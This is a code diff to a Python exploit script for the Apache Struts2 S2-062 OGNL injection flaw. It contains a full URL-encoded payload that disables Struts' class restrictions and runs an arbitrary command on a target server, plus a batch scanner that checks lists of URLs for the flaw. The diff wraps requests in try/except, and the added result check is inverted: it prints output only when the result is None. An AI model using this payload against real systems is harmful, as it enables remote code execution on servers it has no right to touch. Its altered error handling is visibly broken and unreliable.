@@ -12,11 +12,17 @@ requests.packages.urllib3.disable_warnings()
 def exp(url, cmd): 
     payload = "%25%7b(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application%5b%27org.apache.tomcat.InstanceManager%27%5d).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr%5b%27struts.valueStack%27%5d).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d%7b%27"+cmd+"%27%7d).(%23res%3d%23exec.exec(%23cmd))%7d"
     tturl=url+"/?id="+payload
-    r=requests.get(tturl)
-    page=r.text
-    page=etree.HTML(page)
-    data = page.xpath('//a[@id]/@id')
-    print(data[0])
+    try:
+        r=requests.get(tturl)
+        page=r.text
+        page=etree.HTML(page)
+        data = page.xpath('//a[@id]/@id')
+        if data[0] == None:
+            print(data[0])
+        else:
+            print("结果为空")
+    except:
+        print("执行出现异常错误")
 
 #批量扫描漏洞
 def scan(file):
@@ -32,8 +38,10 @@ def scan(file):
             data = page.xpath('//a[@id]/@id')
             if "YaunSky2020" in data[0]:
                 print("[+]"+url+"存在s2-062漏洞")
-        except requests.exceptions.ConnectionError:
-            r.status_code = "Connection refused"
+        #except requests.exceptions.ConnectionError:
+        #    r.status_code = "Connection refused"
+        except:
+            pass
 
 @click.command()
 @click.option("--url", help='Target URL; Example:http://ip:port。')
